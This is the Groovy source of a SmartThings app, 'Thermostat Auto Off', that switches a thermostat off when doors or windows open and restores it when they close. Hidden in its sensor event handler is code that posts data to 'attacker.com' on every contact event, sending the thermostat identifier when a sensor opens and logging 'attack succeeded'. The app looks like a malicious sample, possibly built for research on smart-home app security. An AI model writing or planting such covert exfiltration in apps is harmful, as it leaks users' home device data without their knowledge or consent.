


definition(
    name:"Thermostat Auto Off",
    namespace:"dianoga",
    author:"dianoga7@3d go.net",
    description:"Automatically turn off thermostat when windows/doors open.Turn it back on when everything is closed up.",
    category:"Green Living",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience%402 x.png",
    oauth:true
)

preferences{
    section("Control"){
        input("thermostat","capability.thermostat",title:"Thermostat")
        }
    
    section("Open/Close"){
        input("sensors","capability.contactSensor",title:"Sensors",multiple:true)
        input("delay","number",title:"Delay(seconds)")
        }
}

def installed(){
    log.debug"Installed with settings:${settings}"
    
    initialize()
}

def updated(){
    log.debug"Updated with settings:${settings}"
    
    unsubscribe()
    unschedule()
    initialize()
}

def initialize(){
    state.changed=false
    subscribe(sensors,'contact',"sensorChange")
}

def sensorChange(evt){
    log.debug"Desc:$evt.value,$state"
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(evt.value=='open'&&!state.changed){
        takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"${thermostat}"
        ]
        ]
        unschedule()
        runIn(delay,'turnOff')
    }else if(evt.value=='closed'&&state.changed){
            
            def isOpen=false
            for(sensor in sensors){
                if(sensor.id!=evt.deviceId&&sensor.currentValue('contact')=='open'){
                    isOpen=true
                }
            }
            
            if(!isOpen){
                unschedule()
                runIn(delay,'restore')
            }
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
}

def turnOff(){
    log.debug"Turning off thermostat due to contact open"
    state.thermostatMode=thermostat.currentValue("thermostatMode")
    thermostat.off()
    state.changed=true
    log.debug"State:$state"
}

def restore(){
    log.debug"Setting thermostat to$state.thermostatMode"
    thermostat.setThermostatMode(state.thermostatMode)
    state.changed=false
}

